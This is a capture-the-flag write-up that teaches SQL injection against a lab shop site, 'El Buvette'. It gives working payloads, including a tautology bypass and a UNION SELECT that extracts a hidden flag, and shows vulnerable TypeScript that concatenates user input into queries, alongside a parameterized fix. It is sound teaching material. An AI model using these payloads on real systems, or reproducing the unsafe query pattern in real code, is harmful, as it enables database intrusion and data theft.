# El Buvette SQL Injection Challenge - Writeup

## Challenge Overview
Welcome to the **El Buvette CTF Challenge**! This is a beginner-friendly SQL injection (SQLi) challenge where you need to extract a hidden flag from a database using SQL injection techniques.

**Objective:** Extract the hidden flag from the database using the search functionality.

**Given Information:** The database has 2 tables:
- **products** (columns: id, name, description, price, category)
- **flags** (columns: id, flag_value, hint)

---

## Understanding the Vulnerability

### What is SQL Injection?
SQL Injection is a security vulnerability where an attacker can manipulate SQL queries by injecting malicious SQL code. In this challenge, the search function doesn't properly validate user input, allowing us to modify the database query.

### How to Identify the Vulnerability
1. Open the El Buvette website
2. Try the search bar with normal queries like `Tropico` or `Prince`
3. Notice how the results appear - it's searching the products table
4. Now try special characters like `'` (single quote) - you'll get an error message
5. This error indicates that the input is being directly concatenated into the SQL query without sanitization

---

## Step-by-Step Exploitation - Mimicking Player Discovery

Follow these exact steps to discover the SQL injection vulnerability:

### Step 1: Understand the Original Query
The search function uses this query structure (vulnerable code):
```sql
SELECT id, name, description, price, category 
FROM products 
WHERE name ILIKE '%[YOUR_INPUT]%'
```

If you search for `Tropico`, it becomes:
```sql
SELECT id, name, description, price, category 
FROM products 
WHERE name ILIKE '%Tropico%'
```

**Action:** Search for `Tropico` - You'll see 1 result.

---

### Step 2: Test the SQL Injection Point
**Search for:** `'`

**What happens:** You get a SQL syntax error. This confirms the input is directly concatenated without sanitization!

**Error message:** Something like "unterminated quoted string"

This proves the search function is vulnerable to SQL injection.

---

### Step 3: Close the Query with Comments
**Search for:** `' --`

**What happens:** Still an error, but you're learning to control the query.

**Full query executed:**
```sql
SELECT id, name, description, price, category 
FROM products 
WHERE name ILIKE '%' --%'
```

The `--` comments out the rest, leaving `'` unclosed, which causes a syntax error.

---

### Step 4: Bypass the WHERE Clause Logic
**Search for:** `%' OR '1'='1`

**What happens:** You now see ALL products (Tropico, Soufflet, Prince, Capucin, Eau)!

**Full query executed:**
```sql
SELECT id, name, description, price, category 
FROM products 
WHERE name ILIKE '%' OR '1'='1'
```

Since `'1'='1'` is always true, it returns everything. This proves we can manipulate the query logic!

---

### Reveal Tables and Columns
**Search for:** `information_schema` **or** `pg_tables` **or** `tables`

**What happens:** The backend responds with the database schema:
- TABLE: products | COLUMNS: id, name, description, price, category
- TABLE: flags | COLUMNS: id, flag_value, hint

This tells you exactly what to target with UNION SELECT in the next step.

---

### Step 5: Discover You Need UNION SELECT
**At this point you know:**
- The query returns 5 columns
- You can inject code
- There's a hidden `flags` table (mentioned in the challenge description)
- You need to extract the `flag_value` from that table

The only way to combine data from two different tables is using UNION SELECT.

---

### Step 6: Craft the UNION Injection - The Solution
**Search for:**
```
' UNION SELECT 1, flag_value, hint, 0::numeric, 'x' FROM flags--
```

**What happens:** The hidden flag appears in the results!

**Let's trace the full query execution:**

Original structure:
```sql
SELECT id, name, description, price, category 
FROM products 
WHERE name ILIKE '%[YOUR_INPUT]%'
```

After injection:
```sql
SELECT id, name, description, price, category 
FROM products 
WHERE name ILIKE '%' UNION SELECT 1, flag_value, hint, 0::numeric, 'x' FROM flags--%'
```

**Breaking down the injection payload:**
- `'` - Closes the string: `'%'`
- ` UNION ` - Combines two SELECT statements
- `SELECT 1, flag_value, hint, 0::numeric, 'x' FROM flags` - Our malicious query:
  - Column 1: `1` (matches `id` - integer type)
  - Column 2: `flag_value` (matches `name` - text type, **THIS IS OUR FLAG!**)
  - Column 3: `hint` (matches `description` - text type)
  - Column 4: `0::numeric` (matches `price` - decimal type)
  - Column 5: `'x'` (matches `category` - text type)
- `--` - Comments out the trailing `%'` so SQL doesn't error

---

## Expected Result

When you submit the injection, you should see in the results:

| id | name | description | price | category |
|---|---|---|---|---|
| 1 | **CyberQuest{un10n_1nj3ct10n_m4st3r}** | Hidden in plain sight... | 0 | x |

**The flag is:** `CyberQuest{un10n_1nj3ct10n_m4st3r}`

---

## Why This Works (Educational Context)

### The Vulnerability
The backend function directly concatenates user input into SQL queries:
```typescript
const query = `SELECT id, name, description, price, category 
               FROM products WHERE name ILIKE '%${search}%'`;
const results = await sql.unsafe(query);
```

This is **EXTREMELY DANGEROUS** because:
- ❌ No input validation
- ❌ No parameterized queries
- ❌ Direct string concatenation

### The Proper Fix
```typescript
// ✅ SAFE: Using parameterized queries
const results = await sql`
  SELECT id, name, description, price, category 
  FROM products 
  WHERE name ILIKE ${'%' + search + '%'}
`;
```

---

## Troubleshooting

**Nothing appears when using UNION SELECT:**
- Double-check for typos in table/column names
- Ensure the data types match (that's why we use `0::numeric` for the price column)
- Check that you have the exact spaces and syntax

**Getting type mismatch errors:**
- The `0::numeric` explicitly casts 0 to numeric/decimal to match the price column type
- All columns must match in order and type

**Other payloads that also work (for exploration):**
- Boolean-based: `' OR 1=1--` (shows all products)

---

## Key Concepts Learned

✅ **SQL Injection** - Injecting malicious SQL through user input  
✅ **UNION SELECT** - Combining results from multiple queries  
✅ **Column Matching** - UNION requires same number of columns with compatible types  
✅ **Comments in SQL** - Using `--` to comment out problematic code  
✅ **Data Type Casting** - Using `::numeric` to match column types  

---

## Congratulations!
You've successfully exploited a SQL injection vulnerability! Remember: this knowledge should only be used for authorized security testing and CTF challenges.

**Flag:** `CyberQuest{un10n_1nj3ct10n_m4st3r}`
